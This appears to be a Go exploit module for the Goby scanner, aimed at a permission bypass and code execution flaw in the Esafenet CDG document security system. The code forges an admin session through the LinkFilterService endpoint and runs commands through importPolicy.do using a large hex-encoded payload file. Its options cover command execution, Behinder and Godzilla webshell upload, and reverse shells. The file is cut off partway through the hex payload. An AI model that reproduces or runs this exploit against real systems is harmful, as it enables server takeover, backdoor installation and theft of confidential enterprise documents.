package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Esafenet Electronic Document Security Management System LinkFilterService API Permission Bypass Vulnerability",
    "Description": "<p>Esafenet Electronic Document Security Management System (CDG) is an electronic document security encryption software that utilizes transparent encryption technology at the driver layer. By encrypting and protecting electronic documents, the system prevents internal employees from leaking information and external personnel from illegally stealing important data assets of the enterprise. It provides full lifecycle protection for electronic documents, and the system has multiple encryption methods such as transparent encryption, active encryption, and intelligent encryption, Users can deploy gradient document encryption protection with varying degrees of intensity according to the different levels of departmental confidentiality (such as core departments and ordinary departments), achieving an organic combination of technology, management, and auditing, and building a three-dimensional overall information leakage prevention system internally, achieving a balance between cost, efficiency, and security, and achieving data security of electronic documents.</p><p>The Esafenet electronic document security management system has a Permission Bypass vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2023-12-08",
    "PostTime": "2023-12-08",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "GobyQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "Level": "3",
    "Impact": "<p>The Esafenet electronic document security management system has a code execution vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.esafenet.com/dzwdaqglxt\">https://www.esafenet.com/dzwdaqglxt</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login,cmd,webshell,reverse",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "webshell=custom"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "Permission Bypass"
    ],
    "VulType": [
        "Code Execution",
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2023-59457"
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 LinkFilterService 接口权限绕过漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。<br></p><p>亿赛通电子文档安全管理系统存在权限绕过漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.esafenet.com/dzwdaqglxt\" target=\"_blank\">https://www.esafenet.com/dzwdaqglxt</a></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统存在权限绕过漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "权限绕过",
                "代码执行"
            ],
            "Tags": [
                "权限绕过",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Esafenet Electronic Document Security Management System LinkFilterService API Permission Bypass Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>Esafenet Electronic Document Security Management System (CDG) is an electronic document security encryption software that utilizes transparent encryption technology at the driver layer. By encrypting and protecting electronic documents, the system prevents internal employees from leaking information and external personnel from illegally stealing important data assets of the enterprise. It provides full lifecycle protection for electronic documents, and the system has multiple encryption methods such as transparent encryption, active encryption, and intelligent encryption, Users can deploy gradient document encryption protection with varying degrees of intensity according to the different levels of departmental confidentiality (such as core departments and ordinary departments), achieving an organic combination of technology, management, and auditing, and building a three-dimensional overall information leakage prevention system internally, achieving a balance between cost, efficiency, and security, and achieving data security of electronic documents.</p><p>The Esafenet electronic document security management system has a Permission Bypass vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.esafenet.com/dzwdaqglxt\" target=\"_blank\">https://www.esafenet.com/dzwdaqglxt</a></p>",
            "Impact": "<p>The Esafenet electronic document security management system has a code execution vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution",
                "Permission Bypass"
            ],
            "Tags": [
                "Code Execution",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10889"
}`

	getCookieCSPOAJEKDIPOW := func(hostInfo *httpclient.FixUrl) (string, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/CDGServer3/LinkFilterService")
		postRequestConfig.Header.Store("Accept", "*/*")
		postRequestConfig.FollowRedirect = false
		postRequestConfig.VerifyTls = false
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postRequestConfig.Data = "path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB"
		cookieResponse, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err == nil && cookieResponse != nil && strings.Contains(cookieResponse.HeaderString.String(), "Location") && strings.Contains(cookieResponse.Header.Get("Location"), `jsessionid=`) {
			cookie := "JSESSIONID=" + cookieResponse.Header.Get("Location")[strings.Index(cookieResponse.Header.Get("Location"), "jsessionid=")+11:strings.Index(cookieResponse.Header.Get("Location"), "jsessionid=")+43]
			verifyCookieConfig := httpclient.NewGetRequestConfig("/CDGServer3/frame.jsp")
			verifyCookieConfig.Header.Store("Cookie", cookie)
			verifyCookieConfig.VerifyTls = false
			verifyCookieConfig.FollowRedirect = false
			verifyCookieConfig.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
			verifyCookieResponse, err := httpclient.DoHttpRequest(hostInfo, verifyCookieConfig)
			if verifyCookieResponse != nil && verifyCookieResponse.StatusCode == 200 && strings.Contains(verifyCookieResponse.RawBody, `/sysmanage/main.jsp`) && strings.Contains(verifyCookieResponse.RawBody, `oa_left_middle`) {
				return cookie, nil
			}
			return "", err
		}
		return "", err
	}

	executeCommandDMJOIUWHUEDAISDNOJIAh := func(hostInfo *httpclient.FixUrl, cookie, cmd string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/CDGServer3/dlpPolicy/importPolicy.do")
		postRequestConfig.Header.Store("Cookie", cookie)
		postRequestConfig.Header.Store("cmd", cmd)
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=------------------------26befc614f585c9c")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		fileContent, _ := hex.DecodeString("C999A3E245F035D6652FAF5AE67514A341BB8A115AA78C6F079E0F2E7820A0EFC5DA4E6DA22D5304B20CE68E1FEBCBC1E159FAB7B93755066D77AEDA257A7A8E692180DB66FEC2630562257546AA6E4ECD7234A8AE8F94599A2F729D11A5DB81284BAEA2E4798EB49854522EF46AF864CA6021150C4961E6FE71DD56E47EF9FE0B58411CBFEAB8168EACA2E84290F4645B67B905119D4D3EB7AD042446C3496120D6D049F30D6D3D0BD588F4683F2AEE9B41398CE8F1D0AB645AD6F6216ECF49C9AEEC732BE56D7D2542B3DE2C7784BD8753E6B889AE637D119E3A2F22751F58A75468D0AC171E1BB4C341D328C908318DD8710F661E21E58F9C4FD6985087D1D5EB4B1AEA873356E9692147DC72E770E7AA4DDC54B1FBCDA3D46F9F7B10456F82D89B2F53CEA0E7E0874B0A505CB087206DBB189F45414923622F40A5E0F64BF10479BA904CDC8C3EA90026C1828F68990431232FECBA60829428FF00D32411385D2A0AF6855BD7BA5B135B6F4A88836230F434F209F8D5B01EE72BAE6E17BEA85CE747AD760AB9B0A805F53427BD3323FE361131AA80BE67BF29D0398CCC05DF559930D702CF681CA99FBC5BABCCBE3557053468A0F94C7EDD0ED8D75D1D49AB24C32B35AFA803602FFBE27CECB192066DF2D20D62F98725F418791D3E52E1AFAC8592B8CFBAD8CA77182B1918CD23BA5BA76BBEA52BFBF279EEE4D87B52546C42F3CA1EF93150DCC673FF07238EC587FC220DC40A459C74096179FFE6EF735BA6B595DDEBFBAFDC31A486D02025C15E8BA623792429E6B242F5F3F5BA37711C29D6A2354F11F4D944E4791AB77CC83F92E31C0791D069330C08B41F85DE9CE9B1618B14B49AAB09E33BBA097DF7B3C2F1467A94A336BDD18712C53BE2A9E9B0CF7B0199160EE2871F27C8B3AB81ECC0D3ADDB058E72CA6D999DD400E5E8D46CD296C28DDFAB25027F48BED522E33C279D04A485B4CBBDB53C87319ED39100FD3BF2F43BE332FA2E4DC1D66D1D7C8C82E9E35101D0C6981F524BA7F10182D42B8072989FA1521FBB70F48713A498A3A6115E6AA29C7D2B89D05771CE810030692017D9FABC9A0A42798BA81FFC3F3E2E898ADBEE98B4A7A9D7127E2D2BE78B1B375D3F5242E1F59C9AF3E61EEE6C940C0407944DB3A87143D5DEA52EBDC484978CDEED896ED8BEA0D3B6779C891135C12030AFA14D0ECCD3C3AC19B3AB895BD69099AA5A9F8015A26E14D0DC990F0B18881E2476DA2193041DD7A398EE85817BD0A8EE11EC499D28833D72EDB538824C526FABA454F8327AE3307A743F9DC436F732485493C0A6C447A39D00BC54F2A3E6971F532AC18284621E43B85C1E70095D65A161B5388A6E12A8D7862082B637C3952EBF0627D95A3F8FCA5DF6AEC8E3251CB59CA232BA1140B9BFC989A8A07F01DD9CB9148A0F80EB1B86390BEE35AA12D142D1CA31FB5A9C4F077C306BEC3C794F1A6A113EF67C4F02C80D5588246667068F92FE8420A87D84D9FB95808AE475A1ED714AAB613DA42246BE2623BBF9DDA9FD4FCBBC3428BBBEBCC1AE9F9FDDE6DB1217225EE1708CFC5CF22B11A4BA83D5BDD58AC0D48A1D81AB72C05BB869F6AC247101172AE5B79EFB1A5B57F09DA4B59D572C60CA3BFB03B98C9245E0186C1ABC04AA9FF4EABC49266DE3BE3E3A5B710FC8FB89BFCC7C2ACBF8D9EB440E2787688EAB455FFAD17C7D3461B5F07F1C6C9709ACDAC9E97FC8D99FB262C909CEA76C41252B159A3F9940AEEDB36269398BDE9439F14E4591AACAA0FDF5CAA25D0BF951BF677E31572ADEE75BF6BFB01A5160B87709C81D10F3EC744D775154523196CE991E9F67B2296E145FA8F07509E43A44AD5583781C55B24694BFF339DB5463A12B88DFA1FA1DC1FC29791882F64B0EFB09BE07C2A97D0ABF3C920A9DC7BF09187986D8D552F34C11F72A486594221FC1EB9E64A1E7968208C8DE4949629A0D0EC279F9C4C1667A88BDE3EDE7271B2CDED94757FD53482F245ECDE1E355C5128075A117C1BBE94B42A3AE75D17B04903304BDC0AFCBA1C65A37FAB9392C350987B37961FC168253F9482AE5B5899A7E43A3702AD3926465598418C798C3B5344545B8C880816E1D89BF0A1813270DE6010353ED0C422731C11D85B0E80683D0725D427F67E72F382ACCEDEB444A9B57A896296A18E4AB70D69379F53DA4327D33B77B3EA8BAA2072A2458BFA099B80E4AFD494523635BBA5C1B25C346CA11C28F6FB1875ADE3D35F9BCFFC45709C3424C2C99A0696B16F9644EFFDF4DB0A38E52EF345321FB389E1E14F9C5AF504838DEACB9417823F4EE632DE7E7B6EABBAFCE8967F9E4C6126F5B385487D14ADE8FBF80C655822D8FD4513DDF490FF287D0198F62F9056C63A711F99072A4E4E37728D138B3B107D4C0E11DBE015A326BED7118502088793AB448C723661E604C7FEAB7D6A644F487A3602940AA27F534B3DA93EAE9B726CDB82D2C4AE551850EE470B8AA4241501ED6CEE2BBC86BE921F4CFF77309D627C5C5ACD7483649589D38886DCB10AAC5678FBF196456FDE1B8A5E65CE72B2A89675F65E440CAF2D0A6E0614306F1745D741D5C0E71B76F8705B18624D76E29D7563C85816E0B6F9DB9CFB529621C72FADA4DD69E4F69B3F8433D4C36D4B054F41F4EA0CEC7BDB1AFA84D42C7FFE02801D7564594425C54797CA49BBA508B99400824B64FEF43B2AF72822FC8546D809E5E3652D5FF7A1C3CE0EF47C7A263A87FD95FA689632109BAC2CEC7DB6AC82EECF07B2AE6E84F8EF8A78B83BFBBFBBC78AB331A1919377B6DEA723EA1E924D8252D7FCBEF34EA51D4AF418A2E39C6217236DFB2648FDDC1A8C0B1D6BF73198C7A3B10E21FC319C3B477B8656352F3FCA41B36D76C7D831846FF581153F65A2214CCCFA2B7B1A17E0D840732E37D77E6D30A4F2D01B472469A7490C04B163F123723308173305F786114286111EE1206408A6F967850338E55A9E7A8C2443ABDE820A7C73721DAF6F0AA7D6A89BCB11FAA50B30AFB02DD5F461C65A1E0E10AE8AB325D2D39C418943A82A83C6DA43838E143B16B0732BD3CDA283E9283854915B8BE26D28685E7C9571C2AB1534ABDFD684416FD59A81427D34184FD182E76955F852D13B538ADBB5D89DED70BFF04A02700CE2656437CFD9BF9C3268017DD105A65939F6A19B24322A648A04FC9355642C9ADE596D2C22C706BE45FDB1B56D0A860270DEF2FD903891DF1B040AE92EBA9FFE5719605139A3C33FAA95425E108AC052BA6698E3F98B0F51DD6DDB1D53A880811F7672EB6B98E75B29D54722D1BC64C75CD757B1F82B60983A2BB9B49694F0C1A50288F3A24AF4773521BFE1F0C210AD25BDB90E4DA2C1EA09188003F6DBD37DAB2ABD8C4331F2B059AF32C9431C41A5F6BA9D0FB392E5A1DCC558D1D2E3A68EEB7ECAE4F59B0123CB7D268A7820E59179D8E2F1D99FED4BBE1956154A9DE406D0E1594EC0BD84A0476D35BED6F7D33C944A1788C4CFB01FF12765D5ADC9A2E7E2C6070CD74AAD3DDE431FE110EA01DD151950762456C7FBFB096A2797693635B25E49D151E02B28166CB648D863F210628EBD768C8487676FAE1DDE908FA17C0F6DCDEAE347BDE72EF83033F3C9369B0B7A86BE47E0F23629F9AB9380F1CC03872524C2A2459DE47B93AE3BF1D61CA589426F353B2F1B72303FE789FA5BF2BB794A25907701ACFA69E6FB85C69237294194A5169E7EB94A5B77997D0BF4EF65FF147028B89CB5C8D67E3A786BC8CFD65B629677B4FC5C882098CAAD9DF61178AE8212538A2733552F36B3344BFD09D1A888AA3E93EF53BE74398F8AB6E624177219C03B75F0A29BE416E94A551C4E6E39A1B8F14A77FE84C8C12EF9F7D88EFA4EEF361F49967F04F880DEE6A7B3B44C80AEBFF57D356AE7C155DF5B7B405636DF496E4F3B6A37BBA804F752AF49F07DD3A51AD0F22E73A56FFDA87898E6B9677EABAA04B3308A00E5D48F92188BD6A175B40E665D7CEC7570E1A4C1339FACB429DA64C1B39D21AA0C0FF071E70E030237FB9A17CA230E82FA968A375EBA1ED30F58D5C260E1D4312B3A77DFE25413A16D7F4F2BA021B87F5AC7367D45A25428F8D3A680CB5DA328DB32723395862449B2DA119CA2DBB79E3E713D4C1DB0A29EE5D13F50ED1944609CEB1F056D987F5F5C98A811E77855B28086FC54A47E723F779C4855E7A1D0ABF773D2A65937B721EFA37281816F12B053BC9254ACE9E08A3D486747239F2951509A2FE7C1FA34BEC18F0829505EA32746915040E8819678E2D4A2B90A9189211D8DFBB577BE46AA25F5C7887408BA29FD1AD7691A6E6675EAD50DD56408EB46C75506D430D900B22F9F0BBFAF374385E11423361FD963CA1D213D9F1A595ED86781BC73E5CAF732494EFE88C0562C60F9B3D188CDD0D7DE3C37925AFDD26E04A4EB1351C69DA53F69D817D944F0AB5B4F4D961A502D50A64D98E1C88B903E2296207C0E5C62AD8E46D2E48549642659B0705F50F33255A939CB5C6D308A9270DEA933FC50493CB513BD4FB6B353D1DBB277CE075B7014F56B9720425E03E5210BAFD423E30914F5E27FE6EE67E3B7C6D4D6B48996B69E782BF278B29610BB04D49E7CD5A91561B4CF957379E31D95988EFD6E8C364FAFF940D6786343DE93D74026C5CF734436578522E10C45A7FD6692538BE0A305630F717017BD5FE5DC3ECD47B0A4F214E69F4109B90B63E6D5F8E25F9D41B4BA0B60B7B7A141CC3ACB4233E6CA858491E924D21424444E595513230321862009402EF356AE0668475C673180F249E91B0F9807975074BCD0C9848D911F3756EEF974E423A35050C4F2737B3D952839A4823D81C16AEB54684CC1ED0382728A1D8E7C66AD6F607950DC546E2FB2B4EDBA24D0C8982CFA82D4A649F5A2B147FCE2975F39E727B89A2630C417F320CC250AED2F3B4567C7E87F982FE718441794C6F3B8AF436A6657F96BD371FFF817B7AAE580C6B0CD814E63DB7930272B1A8B2E02175BB28E011B1ECB92726FA559C3C972C83AAB2381CA21CF5B5CE07564681EC12A232C3028C6E4932B25BFCD1870E275E0EF1286F74F75BCFF7BDE0A2993E73D2223F8D3DF2314C0F94785A5CB99F18BA1C7F8CEA45C8A717E8E1C8FE94387881990083D90F5D2B5968C1FD5943F8B2AF6717280BF57434EC8BE0183F15FA19A46CB09597C47BD7DE14B2159FF62F3228165FE8C51BCF281859AAD9AA3C0F2C3B4E84191E01B423B3480F0E5B27EAFDC19407A7602BD73EFC4AC694506130633AD5B00489BA726F8D7883D0E63B431B2CCA4B90320543B5CA871B3618AA62FC4D06DDF43538E96FE055DADC367BE7FFC0FA799F7F3F4F181D77E69D2E8CBB3EEB85A58EDE6982C39ACB8B9B02FA79C43ABF86F4D3260FDAD7E953176FCA6FA6003B1D4E98F0416E798DC20315BEFABCA026869DCC7A68F865BA21B37090164033677539ACD3329AB5E97E7ECC9422ED375BB3D27694C4BBC4CD6C9E8653198B9060CAFF00DC34693CF1500996A1D1E5DA49B01AA81B49EFD86AD5CB1776F42844BC0D3ACFE21AB79F9100058FB9A09A15B01E246ED6C418927D3F9381ED33F42F4F763DD458085C40233F06CEFABE8FDE446B8389D1919C1A69E0D7C324A259701AD9FE8C841DC797B88780EB3D704A37C13CAACB21BFE90FCC2555EDF9E5A7987A7C111EF0CED5B2F0B1AEEB1537BC5A09050FEF0BCD9CE59F70916A06B7C20B078769F4040BD4211DD0B0DD79C61FB509181C82EBF49EEAAD5D27E09B369B9AEEC908DB0D5C4BC8A1E9724BF3CCC10A497B38EB27029F86A557F146ADD0EE31B7AA93CC221FBC7AEF048E4B457E9879D7781F6CC887E64D7FF79803A2B8E236D9A1EE2FE0354FD37D56511DBA465EB861A141937508A9982A830F59B88F27E3A2BE9D2FBB92FDD2AD8C4355C6C5C026EE4C65E32D4FE451FC8DFEA029A8245AE4BB3B32632033F94D3C257910912D4ECE2F5D2DF0F2E40204323FDF353C0482B0D310865936DF977E9A623029B0EDC664D3F1F44FD9BC871989EA7B07CE4DC0C0179DEC33D345E84B9BF4B956C9BDBD4E291A423F428CECE8F95B9AFDF327D985E054F62496857D55979074B61330965E6F01A22D23AD10FC77BDAB5A2F110D955167B48DD21EAF8E522B54C6B9684215EF23476775660C29CAEA7F0F38585D3750AEAC66335CD9CCF5841C402CD3419D31FBB41E44C82DAF3C6077CBB73B11E5A7CEFC31B1045B35B50C737B89ABC10B985E633E965301CC0386BE1016D9B380261F3B2A494E4938F3F9E6B1363F1C060F606911F489EA10627EE1EFCFEB4098061D5D1E884935C062DDF31EC98BA1614C78C80D9D94156333C3AB4AB053D68F79AABBF73C30A6EE36914D6839BDCA89F6AA2FD712E49C5A4E4CCF008BE1D933E958938FDFBE2BBFFA1620F8A665CB976FEC83CF90717D30EACA96F8E9BC908C5F3884CA42A8AFE1A39514D86B600E28B2D81300C572D3DBC71E6D5213B178CC9DAD2175C76792AD4B2A496D7F1383D7116720FC7A749DBFBB2B03012D823E6C5F12C710188AF571FCC8CB443EFE5C5E1965ACEF09F917FBAC0DC9EF04BCF69169E4C96F7C29290B6FA3E1EC48E42AF1B6145B474B7597BC56F1B5AE83C57DE47E7974A16CFA2D8919CAEE298140EF3BA0842EC5EE176B5763AD25DB48FD7D750C36904C7F41D94295A95C140B5FD0B9A2ED5916FA80473A4A95A8B84580935B59F26492188D6C16E91294EB2DFD8F8B78023E5818F28C756DD91B33F3DA586C272844C1A4514F8DD49843066E28E842D877DCBFF6832CDAA5FF4C7D13227DB4B61FB7B39C94EB42B27DF2AE2F42F6825F643FA4E968A5E6815634B967E441D3015F345900857418AE66B800042DF4B19EFB233530659A34C7471B2466AD27E828FD0FD56F88A8DC6B7A073DD35D6CF28FD0204B53BD08A3F003016B02D5D38622B92D86959E1A62D14DE3A35948E843504B6AFFBB0C3E1FEB5ED509C8D7C29CE41FD7B5CB64966F34FF8F9F2CBEED9A5327432E0FD7A1112CA0221CAAACD4FE0DEC6FC7BF8ECB5215B06F7C44E44CB6B2A01492EC2E91C38BCF6597277A940B8F152B9C84671EB72A5F66B68B93429F122370A670028727EC160C646D6E6D97778A892331CC3E3FADCA3433E1321C2FA76C40264B30A244C2C2145CB13487F19321C88F1854A3B6CC978F146ED6E853397A9A162CAC78BBEDCEFA0E6972B7669608FFAAF47B84D8DCB238041F96B46A555D28585806E813A4807FD95D28E9B7E428C99D5763DE6FF65B7E354D4E724B83DACA1408E460E1D5B6D9B2BC6B31427F4347E7ECEBE71D0CB9A3CF9DDCB721A89D6A889D2ABFD02AD50B5D3816FB2319B4C9D107E3A8EDAE5F98D0CA23F8B535CB96E1B17E2C53584B961EEAC48C19F792AC879816DF30A502E914A183C45088F1CC6D739A975B7AE24E2457F96D05F17137BBCBC08EE0313BB186628F410CE6E15B8499421AA9F4230686755D0FA5D6174081441FBE7B6C41F796836333B5B536C6356FD073D4B2385522480AED3F67C1571EECE5536DD91EB8762122CA87CB30D99ACABA94E1F03F3320D2C46CFA67DF21DEB4A1FA43F25DE3F72354C59528C46466F1D8C41E40A51D5B03B52731A96E07E019C82E749A37A02DE5D7C433CDA3BB47692B5B2F87E28535719F6AB0D141B8E1527D76B843FA7756B087B6C931F077F6386D58057B46F3BA5580C2BD4C6BBFA112AD1EAE57E24B21ABB049DC4210F5E3F1CFBF0D7F222290533BAC72E49960AB215B6C597CF45AF99456B952A08EACE5071FE3AA145157D982B903EFFDAE0E14835EA343E4ABE088413CBCB80340788F6FF5A77E6B8A504809B52CF50C4DEEEC47043C74479D70C60C2133FAFB13582E7CFDCC45BCA5EE1AB67354E071AE3184183AD0693467A5776322A8635E89A3E8D09B417844B219C38F31F92E5B086C256AB30528E904FCECB07FECD0058A35FEBCA1B9B040A07B1BA24D293204464B6B0E7CAA3E73D0EC0426259ACB9FA26B843148E98EB8F960846CEE51D9BA4928B338BE2F82204AED0B0A8C85783AC1C71C0457ED277ADB853826BCAAB4DFA70215D8857CA26E191B1A1D7DB4CC7343A35ACA00E39327F1A3D25711EED2048AE5D926D45CEEFBFBDCE97FFC33AA806CEAC164DC231B8BCBEB113CA8C7BB2DC17008E179171AD0F7FA176E0A43D1F641734907031D62FAD825B561C3674541F6A507BA792A2C462430CDEAA786D59C871A2E1FF4B4F22B8BF1AB991C810F4D48489D1825625A720607C2D345443C2E6C980A7D092CA58F5A20E58F718FDB0CFAB564599B46B7D74219589ECC38407D096782C70051DE353D9CD516BA80B112201DC04E8DFBE00D7DF2A28C876FF312D5B9B5E0E0AC301E3F41652DBB8787087B106FA1830301DBF241764F60B3ADC952AD9AE87C089BDAB9F36138CA819497A67A07810BA5B474D922F6CBB866509C4FAA28F3B76E8E377B9A8DAF4EB06704AB14E7F499C8BD892700C4984060A42A31338ECBA3F425772D5868912F86AEFA05FCCC70C297454858CACA814C5FBD25CD8100B4ABDDCE972D22E1756F879B438C85E001088DB5109E939D23AC4FBADF9F9A279320817E6018574CED3FF02672A56223B78CB0F126D61A8FD2CECE494B895DAFEF6B7CE188710E6B9BEC06A65AF045706A1704BEA7993C8DD3F4057D4C39F5E7F465CE3241A2B301EC8F23EF31E86D88D826D73965A24E2989A7D26406C602CD3EC7922834925F4EE249DFCDB8EB5DA76DAB3503BE688EA2F1C7AAB81A5CED4489EAA8B475518E33A546A6D2EBE2284FADA403FAC8C9369B3DFFA4537C045E101E707A6833E12C99D2D6FC336E44230E40C363CEABFB39BABE7449757288A95D2D9023D459EF738F480DD8F4811FE862510DE0F987EA98EC5262012B753B91C785E56C93653EBEC87A10B21A7D4AA0B3B80DC4A8D6D0534AAFE3BD4963F87ADFBF69477CE7CB4633250ECB9631F8B3F5D7D52DECE040CC6E81C7A1FD3BBE84A450A9AFAA473E737D71AF59A566EA0AF07CFD9A1DC5968FD19BDB9EA6E53E30D63B66AB0031ECF46A8FFB8DFDDB66EEDD249F9DA844D8A4B39009C6763CDA9D5DF60B3A59D486B407E8A2870BCDDAD9621F290230B96108E6C8CCFEBDE3DD8D461FE0129ED02FC16D54E6A78B0928534B3E536DE26687F0217B6530419FA8022CE9E6DD07E906EA5E239EA757E0008FD1AB3B176CACBEE9A96EA5A74DDA74CCAF4D02FB561AE5D429C3DE5A3314E9888AECCC7726F5AB4ADD7DEDB51E97A14AED7FD98745D8281D4D8B87B182399FD07F131FE35E98CD317B4FD54799981F8C367F3E6BE1C1EC7F396E58027D6DC9C91CB474A8BC005F933D518142D7218E1B03AC384525B1D5348215D99C1F2C8BE84875CC1C512B84A1996E7884769F5A294D11734F1CD6615228FDC0D93F76E8F7CE354CC9E030C333BC28D480E7609AE8D5E54F3BBA3A6D12086E47EDAE74F1331A67A16CFC856CDC89A229536616AA3EABC40BC0636FDB7CAD3A7C1602E340F599D35E9535C9CF3FE3986A261D883B7704A3F2CCBB69D669D102ABF9494FDF1AB7C45ED96FE863F5A9EB5080FE1CC05B8D520521D39C7E6A610856F3D786BB4148B719C9FFD9639CC1E928FE8573F73FF5D08119DF9571B85F6B4D8DCCB3C95C288C119CB80D41A2FFB33CA5F6420F38C06B61527F8B64E1C99F69BD57CCA9267B85DB74C6DC4745AE0D840247992A7C3D04A93D986A74C5D332564DF20079B99E21194B0BA62A1DCDA5BD99984811A6C3CA1DA7624D91EA3555C213F638705009E32B6C576C969F8325DDAA1E5039DB86BBB130A727D4F7734C166A1AFF565C5DF62335C19B8CC589828B18428CB7C6738353587F9AAAD95A4EF7E909107982F86D5BC24088D394181E7498370C19707F5B13E18A7FDFF4A1D459F0243E9060CF12FB89B9C7088824B9A2374D6C0D12C1F98257940F5617FCBFE09FE734CAD9A675E42D2ECE4EB886F4380D64D512FA1853E43A48B93293465BE5D5700C6F2C2744243DA28AF22672689448CFB9CB6BB8FEDCB5310759EE45BDD40122B72F757B29FFDBD52A1E00F99995A91766B1737E9CB078513CA68BE5BDD58CBC0DAF4905E2B1AB52C0DD9AE9AD3591FB6FE4C7881FEFDF2A065242EFC08486DBC3CE2C0B29F86D010F086C6F280F275100C52B7AD8C7F5986C4F03E01F61C27949703CFF2FB166DBB66E1B41DE7E8E24BD0E46408D8DFE921E316521F29C545BC8370FEA228CD18D419679E6F86E4F7FAC082D3924A91655B81C8BE26FB8A526B74C7CA2586BF26A53E90A7EE20FA93965FAB90726A8C3FE793E5F31A2A9BD676815439F528E7888C0EAFB2CA681DA5B23E5F58750214D9F1D5AEFD134C43C425342BF4509B9EC97A1937AE7B4410FFBE9CB328568C8A51BAEF563CDA60419580CFC23D728FEACC0945BE85958E876862A93C4DDA2783A2212D2BBD5230440D16E7ECC9B2F022CF24EF28A83C51EC271AE5C51D7F73F79E18D7F49FEFA0242B1F78E4A8244D8C5DC2049C7FFB494A146A171A42D0CEF9D7923FE2170DC2A07CC02C2681C7484C62B9C75AC0871F92038A8B8E422B7A7B14925ECB5A7983F6FE0244ABD85F32152D1F8388D026058526FF6EC2AEC1BA8689EC5A9C2A7F0FC1A5C12C4C9F94AC653046D57F89D0157C9CAA89DCB283C0B273E31377B1